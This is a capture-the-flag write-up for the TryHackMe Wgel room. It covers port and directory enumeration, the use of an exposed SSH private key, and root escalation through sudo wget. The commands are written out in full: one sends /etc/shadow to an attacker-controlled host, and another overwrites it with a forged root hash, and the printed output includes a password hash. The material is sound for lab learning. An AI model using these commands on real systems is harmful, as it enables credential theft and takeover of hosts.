<p align="center">
  THM : Wgel CTF<br>
  Difficulty : Easy<br>
  Room link : https://tryhackme.com/room/wgelctf<br>
  <img src="https://i.imgur.com/2ToxGjL.jpg">
</p>

## Summary

- [Nmap scan](#nmap-scan)
- [Website enumeration](#website-enumeration)
- [Privileges escalation](#privileges-escalation)
- [Conclusion](#conclusion)

## Nmap scan

Like always, let's start with an agressive [nmap](https://nmap.org/book/man.html) scan :  
```
attacker@AttackBox:~/Wgel_CTF$ nmap 10.10.72.16 -A -p- -oN nmapResults.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-16 16:59 CET
Nmap scan report for 10.10.72.16
Host is up (0.077s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.78 seconds
```

There is 2 open ports. The only one interesting for now is port 80. Let's enumerate it.

## Website enumeration

We can use [Gobuster](https://github.com/OJ/gobuster) to enumerate web pages and directories on port 80 :  
```
attacker@AttackBox:~/Wgel_CTF$ gobuster dir -u http://10.10.72.16/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.2.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.72.16/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.1
[+] Timeout:                 10s
===============================================================
2023/01/16 17:02:50 Starting gobuster in directory enumeration mode
===============================================================
/sitemap              (Status: 301) [Size: 312] [--> http://10.10.72.16/sitemap/]
Progress: 1580 / 220561 (0.72%)
```

We found a directory named `sitemap`. Let's take a look at it :  
![](https://i.imgur.com/GaWJdcg.jpg)  

I wasn't able to find anything useful in this directory... But if we look at the source code of the index page at `http://[IP]/`, we can find something interesting :  
![](https://i.imgur.com/xaD1HTt.jpg)  

So we have a possible username `Jessie`.  
I searched everywhere on the website and I didn't find anything useful. So maybe we can try another wordlist using [Gobuster](https://github.com/OJ/gobuster) :  
```
attacker@AttackBox:~/Wgel_CTF$ gobuster dir -u http://10.10.72.16/sitemap/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt 
===============================================================
Gobuster v3.2.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.72.16/sitemap/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.1
[+] Timeout:                 10s
===============================================================
2023/01/16 17:08:58 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.ssh                 (Status: 301) [Size: 317] [--> http://10.10.72.16/sitemap/.ssh/]
Progress: 545 / 4714 (11.56%)
```

We found a directory named `.ssh`. Let's take a look at it using a web browser (you can also use curl) :  
![](https://i.imgur.com/u6tKL29.jpg)  

There is a file named `id_rsa`, maybe there is a private key for SSH in it :  
![](https://i.imgur.com/sxX3IRX.jpg)  

Yes ! We have a private key for SSH ! And we also found a username before. Let's use those two informations to try to login on SSH :  
```
attacker@AttackBox:~/Wgel_CTF$ nano id_rsa
attacker@AttackBox:~/Wgel_CTF$ chmod 600 id_rsa 
attacker@AttackBox:~/Wgel_CTF$ ssh jessie@10.10.72.16 -i id_rsa 
The authenticity of host '10.10.72.16 (10.10.72.16)' can't be established.
ECDSA key fingerprint is SHA256:9XK3sKxz9xdPKOayx6kqd2PbTDDfGxj9K9aed2YtF0A.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.72.16' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


8 packages can be updated.
8 updates are security updates.

jessie@CorpOne:~$
```

We are logged in as jessie ! Let's get the user flag :  
```
jessie@CorpOne:~$ find ./ -type f -name "*user*.txt"
./Documents/user_flag.txt
jessie@CorpOne:~$ cat Documents/user_flag.txt 
*****************************
```

Now, it's time for privileges escalation.

## Privileges escalation

Let's see if we have sudo permissions :  
```
jessie@CorpOne:~$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
jessie@CorpOne:~$
```

The only thing we can run as root without any password is `/usr/bin/wget`. Let's see on [GTFOBins](https://gtfobins.github.io/gtfobins/wget/) how we can use 
wget to get root :  
![](https://i.imgur.com/6nbE6Kz.jpg)  

Let's try this :  
```
jessie@CorpOne:~$ TF=$(mktemp)
jessie@CorpOne:~$ chmod +x $TF
jessie@CorpOne:~$ echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
jessie@CorpOne:~$ sudo wget --use-askpass=$TF 0
wget: unrecognized option '--use-askpass=/tmp/tmp.UPdotlbEW4'
Usage: wget [OPTION]... [URL]...

Try `wget --help' for more options.
```

There is no option `--use-askpass`... Maybe it's an older version of wget... But there is another way to try to get root. We get upload and download files using wget :  
![](https://i.imgur.com/URxJPvr.jpg)  

We can try to send the `/etc/shadow` file to our attacker machine, edit it, and then send it back to the target machine. Let's try this. First, we need to start a 
web server that accepts POST requests. There is a python script [here](https://gist.github.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7) that is capable of 
running a webserver that accepts both GET and POST requests. Let's use it. First, I download and start the webserver on my machine :  
```
attacker@AttackBox:~/Wgel_CTF$ wget https://gist.githubusercontent.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7/raw/a6a1d090ac8549dac8f2bd607bd64925de997d40/server.py
--2023-01-16 17:22:37--  https://gist.githubusercontent.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7/raw/a6a1d090ac8549dac8f2bd607bd64925de997d40/server.py
Résolution de gist.githubusercontent.com (gist.githubusercontent.com)… 185.199.108.133, 185.199.109.133, 185.199.111.133, ...
Connexion à gist.githubusercontent.com (gist.githubusercontent.com)|185.199.108.133|:443… connecté.
requête HTTP transmise, en attente de la réponse… 200 OK
Taille : 1575 (1,5K) [text/plain]
Sauvegarde en : « server.py »

server.py                     100%[================================================>]   1,54K  --.-KB/s    ds 0s      

2023-01-16 17:22:38 (23,3 MB/s) — « server.py » sauvegardé [1575/1575]

attacker@AttackBox:~/Wgel_CTF$ python3 server.py 8080
INFO:root:Starting httpd...
```

Now, let's try to send the `/etc/shadow` file from the target :  
```
jessie@CorpOne:~$ sudo wget --post-file=/etc/shadow http://10.14.32.60:8080/shadow
--2023-01-16 18:24:28--  http://10.14.32.60:8080/shadow
Connecting to 10.14.32.60:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘shadow’

shadow                            [ <=>                                             ]      24  --.-KB/s    in 0s      

2023-01-16 18:24:28 (4,76 MB/s) - ‘shadow’ saved [24]
```

Let's see if we received the file on our web server :  
```
attacker@AttackBox:~/Wgel_CTF$ python3 server.py 8080
INFO:root:Starting httpd...

INFO:root:POST request,
Path: /shadow
Headers:
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.14.32.60:8080
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 1273

Body:
root:!:18195:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
...
...
pulse:*:17954:0:99999:7:::
rtkit:*:17954:0:99999:7:::
saned:*:17954:0:99999:7:::
usbmux:*:17954:0:99999:7:::
jessie:$6$0wv9XLy.$HxqSdXgk7JJ6n9oZ9Z52qxuGCdFqp0qI/9X.a4VRJt860njSusSuQ663bXfIV7y.ywZxeOinj4Mckj8/uvA7U.:18195:0:99999:7:::
sshd:*:18195:0:99999:7:::

10.10.72.16 - - [16/Jan/2023 17:24:28] "POST /shadow HTTP/1.1" 200 -
```

We received the file ! Let's save this in a file and generate a new hash for user root : 
```
attacker@AttackBox:~/Wgel_CTF$ mkpasswd --method=SHA-512 --stdin
Mot de passe : test
$6$rG7Ke59zHaM7C5aI$jOZC/e8D40c3JAvU02gBJMraoZ.uvdDO1OOhd0B3D42OHOIPhsXcx9z2ft.8MFQ4fm3Ti3DhXGlh5lsKqV7.l1
```

Now, let's copy and paste this hash in the shadow file for user root :  
```
attacker@AttackBox:~/Wgel_CTF$ head shadow 

root:$6$rG7Ke59zHaM7C5aI$jOZC/e8D40c3JAvU02gBJMraoZ.uvdDO1OOhd0B3D42OHOIPhsXcx9z2ft.8MFQ4fm3Ti3DhXGlh5lsKqV7.l1:18195:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
...
...
```

Now, we just have to run the webserver again, but this time, we will download the shadow file on the target :  
```
jessie@CorpOne:~$ sudo wget http://10.14.32.60:8080/shadow -O /etc/shadow
--2023-01-16 18:31:37--  http://10.14.32.60:8080/shadow
Connecting to 10.14.32.60:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1378 (1,3K) [application/octet-stream]
Saving to: ‘/etc/shadow’

/etc/shadow                   100%[================================================>]   1,35K  --.-KB/s    in 0,001s  

2023-01-16 18:31:37 (928 KB/s) - ‘/etc/shadow’ saved [1378/1378]
```

Now, we should be able to login as root using the password for the hash we generated before (`test` for me) :  
```
jessie@CorpOne:~$ su root
Password: test
root@CorpOne:/home/jessie# whoami
root
root@CorpOne:/home/jessie#
```

And we are root ! Let's get the root flag now :  
```
root@CorpOne:/home/jessie# cd /root
root@CorpOne:~# ls
root_flag.txt
root@CorpOne:~# cat root_flag.txt 
******************************
```

## Conclusion

This room was not that easy for me. It took me a lot of time to find the `.ssh` directory. Sometimes, using the wrong wordlist can make you lose a lot of time... The 
method for privilege escalation was very original in my opinion. Thanks for this room, and thanks for reading my write ups !
